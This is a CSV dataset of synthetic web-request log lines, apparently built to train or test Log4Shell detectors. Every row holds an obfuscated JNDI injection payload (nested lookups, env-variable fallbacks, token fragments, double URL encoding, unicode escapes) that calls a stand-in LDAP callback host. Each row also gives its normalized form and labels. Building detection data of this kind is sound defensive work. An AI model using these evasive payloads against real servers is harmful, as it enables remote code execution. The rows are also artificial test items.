id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000717,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://callback.local/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000718,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://callback.local/lower} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://callback.local/lower} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000719,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://callback.local/lower},request from user-agent: ${jndi:ldap://callback.local/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000720,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://callback.local/lower},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://callback.local/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000721,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper} HTTP/1.1,get /?q=${jndi:ldap://callback.local/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000722,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000723,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://callback.local/upper} | method: get | host: app.local | path: /metrics,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000724,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper},request from user-agent: ${jndi:ldap://callback.local/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000725,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://callback.local/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000726,2026-05-17,synthetic,GET /search?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://callback.local/upper} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000727,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper},post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/upper},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000728,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper} HTTP/1.1,get /?q=${jndi:ldap://callback.local/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000729,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000730,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://callback.local/upper} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000731,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper},request from user-agent: ${jndi:ldap://callback.local/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000732,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://callback.local/upper},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://callback.local/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000733,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env} HTTP/1.1,get /?q=${jndi:ldap://callback.local/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000734,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000735,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://callback.local/env} | method: get | host: app.local | path: /home,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000736,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env},request from user-agent: ${jndi:ldap://callback.local/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000737,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://callback.local/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000738,2026-05-17,synthetic,GET /search?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://callback.local/env} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,nested_lookup_env_fallback,path,unseen_obfuscation_test,critical
LS-000739,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env},post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/env},1,log4shell,nested_lookup_env_fallback,body,unseen_obfuscation_test,critical
LS-000740,2026-05-17,synthetic,GET /?q=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env} HTTP/1.1,get /?q=${jndi:ldap://callback.local/env} http/1.1,1,log4shell,nested_lookup_env_fallback,minimal_query,unseen_obfuscation_test,critical
LS-000741,2026-05-17,synthetic,GET /api/check?debug=${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/env} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback,uri_param,unseen_obfuscation_test,critical
LS-000742,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://callback.local/env} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_env_fallback,user_agent,unseen_obfuscation_test,critical
LS-000743,2026-05-17,synthetic,Request from User-Agent: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env},request from user-agent: ${jndi:ldap://callback.local/env},1,log4shell,nested_lookup_env_fallback,user_agent_minimal,unseen_obfuscation_test,critical
LS-000744,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${env:AWS_SECRET_ACCESS_KEY:-j}${env:AWS_SECRET_ACCESS_KEY:-n}${env:AWS_SECRET_ACCESS_KEY:-d}${env:AWS_SECRET_ACCESS_KEY:-i}:ldap://callback.local/env},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://callback.local/env},1,log4shell,nested_lookup_env_fallback,x_api_version,unseen_obfuscation_test,critical
LS-000745,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag} HTTP/1.1,get /?q=${jndi:ldap://callback.local/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000746,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000747,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://callback.local/frag} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000748,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag},request from user-agent: ${jndi:ldap://callback.local/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000749,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://callback.local/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000750,2026-05-17,synthetic,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldap://callback.local/frag} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000751,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag},post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000752,2026-05-17,synthetic,GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag} HTTP/1.1,get /?q=${jndi:ldap://callback.local/frag} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000753,2026-05-17,synthetic,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/frag} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000754,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://callback.local/frag} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000755,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag},request from user-agent: ${jndi:ldap://callback.local/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000756,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://callback.local/frag},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://callback.local/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000757,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://callback.local/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000758,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000759,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://callback.local/double} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-000760,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D,request from user-agent: ${jndi:ldap://callback.local/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-000761,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D,request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://callback.local/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-000762,2026-05-17,synthetic,GET /search?q=%2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://callback.local/double} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,double_url_encoded,path,unseen_obfuscation_test,critical
LS-000763,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=%2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/double},1,log4shell,double_url_encoded,body,unseen_obfuscation_test,critical
LS-000764,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://callback.local/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-000765,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-000766,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://callback.local/double} | method: get | host: app.local | path: /home,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-000767,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D,request from user-agent: ${jndi:ldap://callback.local/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-000768,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Fcallback.local%252Fdouble%257D,request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://callback.local/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-000769,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode} HTTP/1.1,get /?q=${jndi:ldap://callback.local/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-000770,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-000771,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://callback.local/unicode} | method: get | host: app.local | path: /login,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-000772,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode},request from user-agent: ${jndi:ldap://callback.local/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-000773,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://callback.local/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-000774,2026-05-17,synthetic,GET /search?q=${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldap://callback.local/unicode} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,unicode_escape,path,unseen_obfuscation_test,critical
LS-000775,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode},post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/unicode},1,log4shell,unicode_escape,body,unseen_obfuscation_test,critical
LS-000776,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode} HTTP/1.1,get /?q=${jndi:ldap://callback.local/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-000777,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-000778,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://callback.local/unicode} | method: get | host: app.local | path: /static/app.js,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-000779,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode},request from user-agent: ${jndi:ldap://callback.local/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-000780,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://callback.local/unicode},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://callback.local/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-000781,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep} HTTP/1.1,get /?q=${jndi:ldap://callback.local/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000782,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000783,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://callback.local/sep} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000784,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep},request from user-agent: ${jndi:ldap://callback.local/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000785,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://callback.local/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000786,2026-05-17,synthetic,GET /search?q=${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://callback.local/sep} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-000787,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep},post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-000788,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep} HTTP/1.1,get /?q=${jndi:ldap://callback.local/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-000789,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-000790,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://callback.local/sep} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-000791,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep},request from user-agent: ${jndi:ldap://callback.local/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-000792,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://callback.local/sep},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://callback.local/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-000901,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000902,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000903,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://probe.example.net/nested} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://probe.example.net/nested} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
